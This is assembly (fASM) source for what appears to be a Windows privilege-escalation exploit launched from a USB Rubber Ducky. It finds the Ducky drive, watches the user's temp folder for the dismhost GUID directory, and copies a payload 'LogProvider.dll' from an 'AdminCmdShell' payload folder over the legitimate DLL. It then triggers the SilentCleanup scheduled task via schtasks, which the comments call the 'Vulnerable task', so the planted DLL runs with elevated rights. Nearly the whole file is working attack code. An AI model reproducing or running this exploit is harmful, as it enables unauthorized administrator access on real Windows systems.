;fASM code for watching a specific folder and then copying a DLL overtop of an existing one.

format PE GUI 4.0
;entry start
entry EntryPoint

;heap 102400
;heap 204800

;CLASSES_DATA_MOVEABLE equ ; mark classes data as moveable

include '..\include\win32ax.inc'

;include '..\include\macro\masm.inc'
;include '..\..\RadASM\masm\inc\debug.inc'
;includelib '..\..\RadASM\masm\lib\debug.lib'


;Class packages
;	include '..\include\macro\classes\ClassesCfg.inc'
;	include '..\include\macro\classes\ClassesMCode.inc'
;	include '..\include\macro\classes\ClassesCore 1.8.inc'
;	include '..\include\macro\classes\ClassesCode.inc'
	
;COM interface include
;	include '..\include\macro\classes\COM Headers\COMBase.inc'
;	include '..\include\macro\classes\COM Headers\COMProxyStub.inc'

;include 'Util_Library.inc'
include 'FileManager.inc'
 
include 'prog.inc'
;include 'com.inc'
	
;-----------------------------------------------------------------------------
; Initialized data
;-----------------------------------------------------------------------------
section '.data' data readable writeable 
align 16

;NameMax					equ 257


AppName 					db	'SCI',0
ClassName					db	'SCI32',0

;wc							WNDCLASS 0,WndProc,0,0,NULL,NULL,NULL,COLOR_BTNFACE+1,NULL,ClassName
;wc							WNDCLASS 0,0,0,0,NULL,NULL,NULL,COLOR_BTNFACE+1,NULL,ClassName
;wc							WNDCLASSEX
wc							WNDCLASS

;_shell 					db	'shell32.dll',0
;_ShellExecute				db	'ShellExecuteA',0

;sei SHELLEXECUTEINFO

;pSink				cEventSink

;Existing path and filename
	Max_DriveLetter 						dd "z",0
	Current_Drv_Letter						dd "c",0
	Test_Drv_Letter 						db "   ",0	;Used to hold "<Current_Drv_Letter>:\"

	VolIter_Exhausted_MSG					db "Volume iteration exhausted! Rubber Ducky drive letter not found!",0
	VolIter_RD_Found_MSG					db "Rubber Ducky drive found!",0
	Src_Drv_Label							db "DUCKYDRIVE",0

	;Full_SrcPathAndFilename				db ":\temp\some_file.txt",0
	Full_SrcPathAndFilename 				db ":\Payloads\Win10_AdminCmdShell\LogProvider.dll",0
	Full_SrcPathAndFilename_length			dd 49	;47 and  +1 for drive letter and +1 for zero terminator

;Destination/New path and filename
	;lpDst_1stHalf							dd	"10",0	;9 + 1 for 0 terminator
	;lpDst_1stHalf							db	0x0A
	lpDst_1stHalf							dd	0x0A
	;lpDst_2ndHalf							dd  "34",0  ;33 + 1 for 0 terminator  -- \AppData\local\temp\some_file.dll
	;lpDst_2ndHalf							db  22h
	;lpDst_2ndHalf							dd  22h		;This INCLUDES the 0 terminator!
	lpDst_2ndHalf							dd  15h		;0x15 = 21  (21 is INCLUDING the 0 terminator!)
	lpDst_LocaleLength						dd	7		;6 + 1 for 0 terminator
	;lpDst_FilenameLength					dd	0Eh		;0x0E = 14  (14 is INCLUDING the 0 terminator!)
	;lpDst_FilenameLength					dd	11h		;0x11 = 17  (17 is INCLUDING the 0 terminator!)
	lpDst_FilenameLength					db	17		;0x11 = 17  (17 is INCLUDING the 0 terminator!)

;ShellExecute test case 			
	;With double backslashes
		;lpShellExecute_Drv_Length		dd	4,0
		;lpShellExecute_WinDir_Length	dd	9,0
		;lpShellExecute_SysDir_Length	dd	0Ah,0
		;lpShellExecute_Filename_Length dd	7,0		;cmd.exe has no backslashes so this stays the same regardless
													;of usage of double backslashes or not!
		;lpShellExecute_Filename_Length dd	1F,0

	;Without double backslashes	
		;lpShellExecute_Drv_Length		db	3,0
		;lpShellExecute_WinDir_Length	db	8,0
		;lpShellExecute_SysDir_Length	db	9,0
		;lpShellExecute_Filename_Length  db	7,0		;cmd.exe has no backslashes so this stays the same regardless
													;of usage of double backslashes or not!

	;Single file path component	
		;lpShellExecute_Drv_Length		dd	0,0
		;lpShellExecute_WinDir_Length	dd	0,0
		;lpShellExecute_SysDir_Length	dd	0,0
		;lpShellExecute_Filename_Length 	dd	1Ch,0	;start has no backslashes so this stays the same regardless
													;of usage of double backslashes or not!

		lpShellExecute_Drv_Length		equ		3
		lpShellExecute_WinDir_Length	equ		8
		lpShellExecute_SysDir_Length	equ		9
		lpShellExecute_Filename_Length	equ		7	;cmd.exe has no backslashes so this stays the same regardless
													;of usage of double backslashes or not!

;locale 					db	"en-US", 0


_error						db	"Error in Msg_Loop!",0
ProcessCreationError		db	"Error with CreateProcess call!",0

_breakpointmsg				db	"Breakpoint Entry",0
_breakpointmsg2 			db	"Breakpoint Exit",0

PauseMsg					db	"Application paused. Click ok to resume.",0

DirectoryCreationDetected	db	"GUID dismhost temp-directory creation detected!",0

FileExistanceDetected		db	"File existance detected in watched directory!!!!",0

Dbg_TimerProc_FileCopy_Title			db	"Breakpoint!",0
Dbg_TimerProc_FileCopy_Msg1				db	"Inside of TimerProc_FileCopy",0

FindFile_Invalid_Handle_Value_Title		db	"Invalid file handle!",0
FindFile_Invalid_Handle_Value_Text		db	"INVALID_FILE_HANDLE",0

Elevation_Complete_Title	db	"You took the red pill.",0
Elevation_Complete_Text		db	"Welcome to the matrix.",0

;InsideStartLabel_DBG_Msg				db "Just entered start label.",0
;CompletedGetModuleHandle_DBG_Msg		db "Inside start label and just completed GetModuleHandle and ShowLastError call.",0
 
WinMain_Pre_RegisterClassEx_DBG_Msg				db "Made it to inside of WinMain setting up RegisterClassEx call and then making the call.",0
WinMain_AfterRegisterClassEx_DBG_Msg			db "Made it to inside of WinMain after RegisterClassEx call.",0

Start_Pre_Initialize_DBG_Msg					db "Next line is the call to Initialize.",0
Start_Post_Initialize_DBG_Msg					db "The call to Initialize succeeded (or at least finished and didn't crash the program)!",0

WinMain_Pre_CreateWindowEx_DBG_Msg				db "Inside of WinMain, about to make CreateWindowEx call.",0
WinMain_Post_CreateWindowEx_DBG_Msg				db "Inside of WinMain, completed CreateWindowEx and ShowLastError call.",0

WinMain_Showing_Window_DBG_Msg					db "Inside of WinMain, making call to ShowWindow.",0

WinMain_Updating_Window_DBG_Msg 				db "Inside of WinMain, making call to UpdateWindow.",0

WinMain_Error_Terminating_Process_DBG_MSG		db "Inside of WinMain, error occured, terminating process, no inside of Error label.",0


WinProc_Create_Main_Window_DBG_MSG				db "Inside of WinProc, making call to Create_Main_Window.",0
WinProc_Create_Main_BackBuffer_DBG_MSG			db "Inside of WinProc, making call to Create_Main_BackBuffer.",0
WinProc_Finished_Creating_MainWindow_DBG_MSG	db "Inside of WinProc, completed creating Main Window DCs.",0

WinProc_Pre_StrCpyN_Call_1_DBG_MSG				db "Inside of WinProc, making call to the 1st StrCpyN.",0
WinProc_Post_StrCpyN_Call_1_DBG_MSG				db "Inside of WinProc, completed making call to the 1st StrCpyN.",0

WinProc_Pre_StrCpyN_Call_2_DBG_MSG				db "Inside of WinProc, making call to the 2nd StrCpyN.",0
WinProc_Post_StrCpyN_Call_2_DBG_MSG				db "Inside of WinProc, completed making call to the 2nd StrCpyN.",0



DBG_MSG_Calling_Build_Full_DstPath				db "Calling Build_Full_DstPath.",0
DBG_MSG_Calling_Build_Full_SrcPath				db "Calling Build_Full_SrcPath.",0
DBG_MSG_Calling_Build_Full_ShellExecPath		db "Calling Build_Full_ShellExecPath.",0

DBG_MSG_Calling_Allocate_Full_SrcPath_Mem		db "Calling Allocate_Full_SrcPath_Mem.",0
DBG_MSG_Calling_Find_RubberDucky				db "Calling Find_RubberDucky.",0
DBG_MSG_Adding_RubberDucky_to_SrcPath			db "Adding RubberDucky drive to Full_SrcPath.",0

DBG_MSG_Allocate_Full_SrcPath_Mem_BP1			db "Allocate_Full_SrcPath_Mem breakpoint 1 hit!",0
DBG_MSG_Allocate_Full_SrcPath_Mem_BP2			db "Allocate_Full_SrcPath_Mem breakpoint 2 hit!",0
DBG_MSG_Allocate_Full_SrcPath_Mem_BP3			db "Allocate_Full_SrcPath_Mem breakpoint 3 hit!",0

;Username DBG Messages
	DBG_MSG_Error_Retrieving_Username			db "Error retrieving username!",0	;Used when GetUserName (GetUserNameA) fails.

;NON-COM based directory monitoring technique error messages
	CreateFile_InvalidHandleValue				db "CreateFile: Invalid handle value.",0

;ShellExecute exception errors
	ShellExec_Err_OOM						db "The operating system is out of memory or resources.",0
	ShellExec_Err_File_Not_Found			db "ERROR_FILE_NOT_FOUND: The specified file was not found.",0
	ShellExec_Err_Path_Not_Found			db "ERROR_PATH_NOT_FOUND: The specified path was not found.",0
	ShellExec_Err_Bad_Format				db "ERROR_BAD_FORMAT: The .exe file is invalid (non-Win32 .exe or error in .exe image).",0
	ShellExec_Err_SE_Access_Denied			db "SE_ERR_ACCESSDENIED: The operating system denied access to the specified file.",0
	ShellExec_Err_SE_Assoc_Incomp			db "SE_ERR_ASSOCINCOMPLETE: The file name association is incomplete or invalid.",0
	ShellExec_Err_SE_DDE_Busy				db "SE_ERR_DDEBUSY: The DDE transaction could not be completed because other DDE transactions were being processed.",0
	ShellExec_Err_SE_DDE_Fail				db "SE_ERR_DDEFAIL: The DDE transaction failed.",0
	ShellExec_Err_SE_DDE_Timeout			db "SE_ERR_DDETIMEOUT: The DDE transaction could not be completed because the request timed out.",0
	ShellExec_Err_SE_DLL_Not_Found			db "SE_ERR_DLLNOTFOUND: The specified DLL was not found.",0
	ShellExec_Err_SE_FNF					db "SE_ERR_FNF: The specified file was not found.",0
	ShellExec_Err_SE_No_Assoc				db "SE_ERR_NOASSOC: There is no application associated with the given file name extension. This error will also be returned if you attempt to print a file that is not printable.",0
	ShellExec_Err_SE_OOM					db "SE_ERR_OOM: There was not enough memory to complete the operation.",0
	ShellExec_Err_SE_PNF					db "SE_ERR_PNF: The specified path was not found.",0
	ShellExec_Err_Share						db "SE_ERR_SHARE: A sharing violation occured.",0

;FindFile errors
	FindFile_Err_NO_MORE_FILES				db "FindFile call failed! ERROR_NO_MORE_FILES",0
	
;FileCopy errors
	CopyFile_Err_ACCESS_DENIED_HIDDEN		db "Access denied: File Attribute is hidden.",0
	CopyFile_Err_ACCESS_DENIED_READONLY		db "Access denied: File is read only.",0

;Username_Length				db	"257",0
;Username_Length					dd  257,0
;Username_Length				db  254,0
Username_MaxLength				dd  254
;TODO: This should be dynamic! However, that entails first retrieving the username and then scanning the name for length and then
;subtracting 1
	;Username_Length					equ 254
;Username_Length					dw  0xFF,0x02,0
;Username_Length_DWord			dd	"257",0


;Destination/New path and filename
	Pre_DstPath				db	"c:\users\",0
	Post_DstPath			db	"\AppData\local\temp\",0
	Post_DstDirPath			db	"\AppData\local\temp",0
	GUID_DirName			db	?
	Locale_DstPath			db	"\en-us",0
	;Dst_Filename			db	"some_file.txt",0
	Dst_Filename			db	"LogProvider.dll",0

	;lpDst_PathTest			db  "\\.\PhysicalDrive0\users\dell\AppData\local\temp",0
	;lpDst_PathTest			db  "\\.\C:\users\dell\AppData\local\temp",0
	lpDst_PathTest			db  "C:\users\dell\AppData\local\temp",0

;ShellExecute_File			db	"schtasks",0
;ShellExecute_Verb			db	"open",0
;ShellExecute_Parameters		db	"/run SilentCleanup", 0

;ShellExecute and ShellCode_Instigator Test case
	;With double backslashes -- DO NOT FORGET TO UNCOMMENT THE PROPER SET OF LENGTH VARIABLES!!!!!
		;ShellExecute_Drv			db	"c:\\",0
		;	ShellExecute_WinDir			db	"Windows\\",0
		;		ShellExecute_AMD64			db	"System32\\",0
		;		ShellExecute_x86			db	"SysWOW64\\",0
		;			ShellExecute_Filename			db	"clc.exe",0	;30 characters +1 for 0 terminator
					;ShellExecute_FileTst			db	"c:\windows\system32\cmd.exe start",0

	;Without double backslashes -- DO NOT FORGET TO UNCOMMENT THE PROPER SET OF LENGTH VARIABLES!!!!!
	;	ShellExecute_Drv			db	"c:\",0
	;	ShellExecute_WinDir			db	"Windows\",0
	;		ShellExecute_AMD64			db	"System32\",0
	;		ShellExecute_x86			db	"SysWOW64\",0
	;			ShellExecute_Filename			db	"cmd.exe",0	;30 characters +1 for 0 terminator
	;

	;Single file path component -- DO NOT FORGET TO UNCOMMENT THE PROPER SET OF LENGTH VARIABLES!!!!!
		ShellExecute_Drv			db	"c:\",0
		ShellExecute_WinDir			db	"windows\",0
			ShellExecute_AMD64			db	"system32\",0
			ShellExecute_x86			db	"SysWOW64\",0
				;This works!
		;			;ShellExecute_Filename			db	"c:\windows\system32\calc.exe",0	;39 characters +1 for 0 terminator
				;This works (by itself)!!!!!
		;			ShellExecute_Filename			db	"c:\windows\system32\cmd.exe",0 ;39 characters +1 for 0 terminator
			;This works
				;ShellExecute_Filename		db	"cmd.exe",0
				ShellExecute_Filename		db	"schtasks.exe",0
				;CreateProcess_cmd			db	"c:\\windows\\system32\\schtasks.exe /Run /TN ""\Microsoft\Windows\DiskCleanup\SilentCleanup"" /I",0
				CreateProcess_cmd			db	"c:\\windows\\system32\\schtasks.exe",0
				CreateProcess_params		db	"/Run /TN ""\Microsoft\Windows\DiskCleanup\SilentCleanup"" /I",0
 
 				sinfo STARTUPINFO
 				pinfo PROCESS_INFORMATION
 
		ShellExecute_FileTst			db	"c:\windows\system32\cmd.exe",0

	;Unicode test
		;ShellExecute_FileTst			du	"c:\windows\system32\cmd.exe start",0
		
	lpShellExec_Verb			db	"Open",0
	;lpShellExec_Verb			db	"runas",0
	;lpShellExec_Verb			db	"RunAs",0
	lpShellExec_Params			db	"/Run /TN ""\Microsoft\Windows\DiskCleanup\SilentCleanup"" /I", 0
	;lpShellExec_Params			db	"/Run /TN ""\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup\"" /I", 0
	;This works
		;lpShellExec_Params			db	"", 0
	;;lpShellExec_Params			dd	?
	;lpShellExec_Params			db	"/K echo",0

;schtasks
;/Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup" /I'

;For cominvoke
	TaskName					db	"SilentCleanup",0

	;Invalid_HexChars			db	'G',0,'H',0,'I',0,'J',0,'K',0,'L',0,'M',0,'N',0,'O',0,'P',0,'Q',0,'R',0,'S',0,'T',0,'U',0,'V',0,'W',0,'X',0,'Y',0,'Z',0
	Invalid_HexChars			db	"GHIJKLMNOPQRSTUVWXYZ",0
	Hyphen_Locations			db	8,4,3,4,0	;Because StrStr doesn't give you the position that the character
												;was found in the string, and instead gives you the pointer of
												;where that character is found in the string (otherwise null)
												;a difference between the memory address of the returning pointer
												;versus the start of the memory address of the string needs to
												;be performed. The variable StrStr_Diff in the uninitialized
												;segment holds that value. As such, these hyphen locations
												;are not the offsets from the previous location, but instead
												;absolute locations referenced from the beginning of the
												;string! This rem'ed out version contains those original
												;-RELATIVE- locations.
												
	;Hyphen_Locations			db	8,13,18,23,0	;Use this set of locations if the memory address
											;will -NOT- be offset each iteration.
	Hyphen					db	"-",0
	Backslash					db	"\",0

	GUID_Length				db  37
	GUID_Located				db	FALSE
	
	FileManager_TestPath		db	"c:\temp\",0
	FileManager_TestFileName		db	"Asm_FileManager_Test.txt",0
	
	FileManager_TestPath2		db	"c:\temp\",0
	FileManager_TestFileName2	db	"Asm_FileManager_Test2.txt",0

;c:\temp\
;Asm_FileManager_Test.txt
;c:\temp\Asm_FileManager_Test.txt

; classes data in this case consist of TIndex vtable 
; this vtable is of only one TIndex.Dec function address 
;	insert_classes_data ; put classes data here 

; declare static instance of our TIndex 
; it will contain pointer to TIndex vtable 
; and value of Index = 0 
;	IndObj  TIndex

 
;-----------------------------------------------------------------------------
; Uninitialized data
;-----------------------------------------------------------------------------
section '.bss' readable writeable
align 16
dd 0

;section '.data' data readable writeable



;section '.bss' readable writeable
	ProcessHeap					dd	?

	;wc							WNDCLASSEX <>

;	BITMAPINFO					BITMAPINFOHEADER
	msg							MSG

	FileInfo					WIN32_FIND_DATA

;	MousePos					POINT

;	rect						RECT

;	ps							PAINTSTRUCT <>

	SystemInfo					STARTUPINFO
	ProcessInfo					PROCESS_INFORMATION

	ShExecInfo					SHELLEXECUTEINFO

	;Used for command line parameter(s) retrieval
;		_strbuf 		dd ?
;		_hheap			dd ?

	hInstance			dd	?

	ShellExec_hInstance	dd ?

	hWnd_Main			dd ?

	; Handles of the bitmap & DC for the Window background
;		hWindowDC		dd	?
;		hWindowBMP		dd	?
		;hTextLayer0_DC dd ?
		;hTextLayer0Bitmap dd ? 

	; Dword that will hold a pointer to the bitmap data in the backbuffer
;		lpWindowBMP		dd	?
		;lpTextLayer0Bmp	dd ?

	; Random seed variable used in the PseudoRandom procedure.
;		RandSeed	dd	?

	; Handles of DC and bitmap for the backbuffer
;		hBackDC 		dd	?
;		hBackBmp		dd	?

	; Handles of DC and bitmap for the monochrome overlay
	; (the bitmap in the resource file)
		;hLabelBmp		dd	?
		;hLabelDC		dd	?



;Existing path and filename
	;Full_ExistingPathAndFilename	db "c:\temp\some_file.txt",0
	VolInfo 						VolumeInformation

	Src_Drv_Letter					rb 1	;The found drive letter, will then to be used in conjunction with Full_ExistingPathAndFilename


	lpVolumeName_Buffer				dd ?


	lpFull_SrcPathAndFilename		dd ?
	;Full_ExistingPaF_Size			= $-Full_ExistingPathAndFilename

	lpFull_SrcPaF					dd	?

;sName								rb NameMax - 1
;Current used version
	;sName								rb 256
;sName								dd ?
sName								dd ?
;sNamesize							=  $-sName
;For some reason, Username is NOT aligned, and thus when HeapAlloc requests memory, and moves that block into the
;offset that which is Username, it tramples sName's data! This is hackish, crude, and pretty much a kludge to get
;it to work. The hack is to just request enough padding after sName such that it won't overwrite it. This means
;dd 0,0,0
rb	100

;Username							dd ?
;Username							dd 0
Username							dd ?
Username_Length 					dd 255

;Username						db 127 dup (?)
;lpUsername						rb 256
;Username_DWord 				dd	127 dup (?)



;Destination/New path and filename	

	;Dst_Path_Length_wo_UN			=	$-lpDst_1stHalf
	
	lpDst_Path_Length				dd	?
	lpDst_PathAndFile_Length		dd	?
											;This should be 33 + 9 + Username_Length + 1 for 0 terminator
											;or another way of putting it: lpDst_1stHalf + lpDst_2ndHalf + Username_Length + 1
											;or another way of putting it: Dst_Path_Length_wo_UN-o_UN + Username_Length + 1
	lpDst_FullPath					dd	?
	lpDst_Path						dd	?
	PathBuf	rb	MAX_PATH

	ThreadID	dd	?
	ThreadHand	dd	?

;ShellExecute test case 
	;lpShellExec_File_Length		rd	1
	lpShellExec_File_Length 		dd	0,0	
	lpShellExec_File				dd	?	;31 + 1 for 0 terminator




	MsgBox_Text						dd	?

;	hFile							dw	?

	MsgBox_Count					dd	? 	;Temporary variable to prevent multiple MessageBoxes from displaying when in
											;the FileCopy procedure.
	Stack_Pointer					dd	?
	Stack_BasePointer				dd	?
; Good MSDN references:
	; https://msdn.microsoft.com/en-us/library/windows/desktop/aa384006(v=vs.85).aspx
	; https://msdn.microsoft.com/en-us/library/windows/desktop/aa446855(v=vs.85).aspx
	; https://msdn.microsoft.com/en-us/library/windows/desktop/aa382529(v=vs.85).aspx




;For NON-COM based directory monitoring technique
	Directory_Handle				dd	0
	lpDirectory_ChangeBuffer		dd	0
	dwDirectoryChange_BufferLength	dd	0
	dwBytesReturned					dd	0
	

	TestChar						db	?
	TestValue						db	?
	StrStr_Diff						db	?	;Because StrStr doesn't give you the position that the character
											;was found in the string, and instead gives you the pointer of
											;where that character is found in the string (otherwise null)
											;a difference between the memory address of the returning pointer
											;versus the start of the memory address of the string needs to
											;be performed. This variable holds that value. It is a throwaway
											;variable and should be considered volatile!
;classes_finalize ; done all with classes


section '.text' code readable executable

proc EntryPoint hInst,fdwReason,lpvReserved

;start:
	;xor eax, eax
	;invoke	GetModuleHandle,0 ;EXE needs to be run as administrator otherwise an Access Denied error occurs (At least on Windows 7), for some reason! EXE also needs to be run in Win XP SP2 compatibility mode otherwise "The specified module could not be found" errors will occur!
	;invoke GetModuleHandle,eax ;EXE needs to be run as administrator otherwise an Access Denied error occurs (At least on Windows 7), for some reason! EXE also needs to be run in Win XP SP2 compatibility mode otherwise "The specified module could not be found" errors will occur!
	
	;invoke GetModuleHandle,eax
	;mov		[wc.hInstance],eax
	mov			eax, [hInst]
	mov			[wc.hInstance], eax
	
	invoke	LoadIcon,0,IDI_APPLICATION
	mov	[wc.hIcon], eax
	
	invoke	LoadCursor,0,IDC_ARROW
	mov	[wc.hCursor],eax
	xor eax, eax
	
	mov	[wc.style],0
	mov	[wc.lpfnWndProc],WndProc
	mov	[wc.cbClsExtra],0
	mov	[wc.cbWndExtra],0
	mov	eax,[hInstance]
	mov	[wc.hInstance],eax
	mov	[wc.hbrBackground],0
	mov	dword [wc.lpszMenuName],NULL
	mov	dword [wc.lpszClassName],ClassName
	
	;As per: https://msdn.microsoft.com/en-us/library/windows/desktop/ms633586(v=vs.85).aspx
	; Note	The RegisterClass function has been superseded by the RegisterClassEx function. You can still
	;use RegisterClass, however, if you do not need to set the class small icon.
		invoke	RegisterClass,wc
		
	;invoke GetStartupInfo,SystemInfo
	;mov ecx, [SystemInfo.dwFlags]
	;or ecx, STARTF_USESHOWWINDOW
	;mov [SystemInfo.dwFlags], ecx
	;;mov SystemInfo.dwFlags,	STARTF_USESHOWWINDOW
	;mov [SystemInfo.wShowWindow], SW_HIDE
	
	mov [MsgBox_Count], 0
		
	;call ShowLastError
	test	eax,eax
	jz		Error

	;invoke  MessageBox,NULL,_breakpointmsg,NULL,MB_ICONERROR+MB_OK
	
	invoke GetProcessHeap
	mov [ProcessHeap], eax
	
	
	call FileManager_Initialize

	;Test code for FileManager library
	;invoke OpenFile_Split,FileManager_TestPath,FileManager_TestFileName
	push FileManager_TestFileName
	push FileManager_TestPath
	call FileManager_OpenFile_Split
	
	push FileManager_TestFileName2
	push FileManager_TestPath2
	call FileManager_OpenFile_Split
	
	;This one seems to work, just for some reason the timer doesn't seem to fire...
    	invoke	CreateWindowEx,0,ClassName,AppName,WS_VISIBLE+WS_OVERLAPPEDWINDOW,400, 300, ALIGNED_WIDTH, WINDOW_HEIGHT,NULL,NULL,[wc.hInstance],NULL
    	;invoke	CreateWindowEx,0,ClassName,AppName,WS_VISIBLE,400, 300, ALIGNED_WIDTH, WINDOW_HEIGHT,NULL,NULL,[wc.hInstance],NULL
    ;invoke	CreateWindowEx,0,ClassName,AppName,WS_POPUP+WS_VISIBLE,400, 300, ALIGNED_WIDTH, WINDOW_HEIGHT,NULL,NULL,[wc.hInstance],NULL

    ;test eax, eax
    ;jz	Error
    mov		[hWnd_Main],eax
	;mov [hWnd_Main], eax
	;call ShowLastError
	;invoke MessageBox,NULL,WinMain_Post_CreateWindowEx_DBG_Msg,NULL,MB_ICONERROR+MB_OK

	mov [Stack_BasePointer], ebp
	mov [Stack_Pointer], esp
		;call Initialize
		;invoke  MessageBox,NULL,DBG_MSG_Calling_Build_Full_DstPath,NULL,MB_ICONERROR+MB_OK
		;This yields an ERROR_INVALID_PARAMETERS result
			call Build_Full_DstPath
		;invoke	MessageBox,NULL,DBG_MSG_Calling_Build_Full_SrcPath,NULL,MB_ICONERROR+MB_OK
		;This yields an ERROR_PATH_NOT_FOUND results
			call Build_Full_SrcPath
		;invoke	MessageBox,NULL,DBG_MSG_Calling_Build_Full_ShellExecPath,NULL,MB_ICONERROR+MB_OK
			call Build_Full_ShellExecPath
	;mov ebp, [Stack_BasePointer]
	;mov esp, [Stack_Pointer]
	;invoke	MessageBox,NULL,Start_Post_Initialize_DBG_Msg,NULL,MB_ICONERROR+MB_OK
	
	;invoke ShowWindow,[hWnd_Main],SW_SHOWNORMAL
    
    
    ;invoke  MessageBox,NULL,WinMain_Updating_Window_DBG_Msg,NULL,MB_ICONERROR+MB_OK
    ;invoke UpdateWindow, [hWnd_Main]
    

	;For NON-COM based directory monitoring technique
		;First get a handle to the directory through the Win32 Createfile API
		;as per: https://msdn.microsoft.com/en-us/library/windows/desktop/aa365465(v=vs.85).aspx
		;CreateFile function API documentation page: https://msdn.microsoft.com/en-us/library/windows/desktop/aa363858(v=vs.85).aspx
		;NOTE: CreateFile ignores the lpSecurityDescriptor member when opening an existing file or device, but continues to use the bInheritHandle member.
		;	   The bInheritHandlemember of the structure specifies whether the returned handle can be inherited.
		;NOTE: You must set this flag to obtain a handle to a directory. A directory handle can be passed to some functions instead of a file handle. For more information, see the Remarks section.
			;invoke CreateFile,dword ptr lpDst_Path,GENERIC_READ + GENERIC_WRITE,FILE_SHARE_DELETE + FILE_SHARE_READ + FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_FLAG_BACKUP_SEMANTICS,NULL
			;invoke CreateFile,lpDst_Path,GENERIC_READ + GENERIC_WRITE,FILE_SHARE_DELETE + FILE_SHARE_READ + FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_FLAG_BACKUP_SEMANTICS,NULL
			;mov ecx, [lpDst_Path]
			
			;mov ecx, lpDst_PathTest
			;invoke CreateFile,ecx,GENERIC_READ + GENERIC_WRITE,FILE_SHARE_DELETE + FILE_SHARE_READ + FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_FLAG_BACKUP_SEMANTICS,NULL
			
			;invoke lstrcat,PathBuf,lpDst_PathTest
			invoke lstrcat,PathBuf,dword ptr lpDst_Path
			;invoke CreateFile,PathBuf, \
			;				  GENERIC_READ + GENERIC_WRITE, \
			;				  FILE_SHARE_DELETE + FILE_SHARE_READ + FILE_SHARE_WRITE, \
			;				  NULL, \
			;				  OPEN_EXISTING, \
			;				  FILE_FLAG_BACKUP_SEMANTICS, \
			;				  NULL
			invoke CreateFile,PathBuf, \
							  1h, \															;FILE_LIST_DIRECTORY
							  FILE_SHARE_DELETE + FILE_SHARE_READ + FILE_SHARE_WRITE, \
							  NULL, \
							  OPEN_EXISTING, \
							  FILE_FLAG_BACKUP_SEMANTICS, \
							  NULL
							  
			;invoke CreateFile,Dst_PathTest,GENERIC_READ + GENERIC_WRITE,FILE_SHARE_DELETE + FILE_SHARE_READ + FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_FLAG_BACKUP_SEMANTICS,NULL
			;call ShowLastError
			cmp eax, 6			;ERROR_INVALID_HANDLE		     equ 6
			je CreateFile_Invalid_Handle_Value
			cmp eax, INVALID_HANDLE_VALUE
			jne CreateFile_SUCCESS
			CreateFile_Invalid_Handle_Value:
				invoke MessageBox,NULL,CreateFile_InvalidHandleValue,NULL,MB_ICONERROR+MB_OK
				;call ShowLastError
				invoke TranslateMessage, msg
				invoke DispatchMessage, msg
				jmp Exit_Proc
			CreateFile_SUCCESS:
				mov [Directory_Handle], eax
				;call ShowLastError

				;invoke	MessageBox,NULL,PauseMsg,NULL,MB_ICONERROR+MB_OK

				;invoke ReadDirectoryChangesW,[Directory_Handle],lpDirectory_ChangeBuffer,FALSE,FILE_NOTIFY_CHANGE_DIR_NAME,dwBytesReturned

				push ebx
				
					;mov		ebx, DirectoryMonitor_ThreadProc
					
					xor ebx, ebx
					lea ebx, [DirectoryMonitor_ThreadProc]
					
					;invoke	CreateThread, NULL, NULL, ebx, NULL, NORMAL_PRIORITY_CLASS, ThreadID
					;invoke	CreateThread, NULL, NULL, ebx, NULL, 0, ThreadID
					;mov		[ThreadHand], eax

				pop ebx
				
				;invoke	CloseHandle, [ThreadHand]
				;invoke TranslateMessage, msg
				;invoke DispatchMessage, msg
				;jmp Exit_Proc


	push ebx

		xor ebx, ebx
		lea ebx, [DirectoryMonitor_ThreadProc]

		;Rem'ed temporarily
			;invoke SetTimer, 0, DIRECTORYMONITORTIMERID, 250, ebx
			invoke SetTimer, 0, DIRECTORYMONITORTIMERID, 25, ebx

	pop ebx


	push ebx

		xor ebx, ebx
		lea ebx, [TimerProc_FileCopy]

		;;invoke	SetTimer, [hWnd], FILEWATCHTIMERID, 80, NULL
		;invoke SetTimer, [hWnd_Main], FILEWATCHTIMERID, 500, NULL
		;invoke SetTimer, [hWnd_Main], FILEWATCHTIMERID, 500, ebx

		;Rem'ed temporarily
			;invoke SetTimer, 0, FILEWATCHTIMERID, 1000, ebx
			;invoke SetTimer, 0, FILEWATCHTIMERID, 275, ebx
			;invoke SetTimer, 0, FILEWATCHTIMERID, 350, ebx
			invoke SetTimer, 0, FILEWATCHTIMERID, 5000, ebx
			;invoke SetTimer, 0, FILEWATCHTIMERID, 30, ebx

	pop ebx

	;invoke SetTimer, NULL, FILEWATCHTIMERID, 500, FileCopy
	;invoke SetTimer, NULL, FILEWATCHTIMERID, 3000, FileCopy 
	;;invoke	SetTimer, NULL, FILEWATCHTIMERID, 500, NULL

	;call ShowLastError



	;This is from the code that actually pops a shell.
		;invoke ShellExecute,NULL,lpShellExec_Verb,lpShellExec_File,lpShellExec_Params,NULL,SW_SHOW
		;invoke ShellExecute,NULL,lpShellExec_Verb,lpShellExec_File,NULL,NULL,SW_SHOW

		;schtasks.exe parameters:
		;/RUN 									- Runs a scheduled task on demand.
		;/TN <taskname>							- Identifies the scheduled task to run now.
		;"\Microsoft\Windows\DiskCleanup\SilentCleanup"	- Vulnerable task
		;/I										- Runs the task immediately by ignoring any constraint.
		;Full line should be:
		;	schtasks.exe /Run /TN ""\Microsoft\Windows\DiskCleanup\SilentCleanup"" /I"m
			;invoke ShellExecute,NULL,lpShellExec_Verb,ShellExecute_Filename,lpShellExec_Params,NULL,SW_SHOW
			;invoke ShellExecute,NULL,lpShellExec_Verb,ShellExecute_Filename,lpShellExec_Params,NULL,1
			invoke ShellExecute,NULL,lpShellExec_Verb,ShellExecute_Filename,lpShellExec_Params,NULL,SW_SHOWDEFAULT

			;CreateProcess parameters
			;	lpApplicationName
			;	lpCommandLine
			;	lpProcessAttributes
			;	lpThreadAttributes
			;	bInheritHandles
			;	dwCreationFlags
			;	lpEnvironment
			;	lpCurrentDirectory
			;	lpStartupInfo
			;	lpProcessInformation
			;invoke CreateProcess,NULL,lpShellExec_Verb,ShellExecute_Filename,lpShellExec_Params,NULL,1
			;invoke CreateProcess,NULL,CreateProcess_cmd,NULL,NULL,FALSE,NORMAL_PRIORITY_CLASS,NULL,NULL,sinfo,pinfo
			;invoke CreateProcess,NULL,CreateProcess_cmd,NULL,NULL,FALSE,0,NULL,NULL,sinfo,pinfo
